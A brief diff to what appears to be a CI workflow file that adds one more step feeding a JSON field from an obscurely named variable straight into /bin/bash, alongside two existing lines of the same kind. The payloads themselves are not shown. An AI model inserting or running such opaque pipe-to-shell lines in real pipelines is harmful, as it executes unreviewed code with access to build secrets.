@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$oqt95613" | jq -r .each9 | /bin/bash
           printf '%s' "$ex09" | jq -r .xs559 | /bin/bash
+          printf '%s' "$h8" | jq -r .jv9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
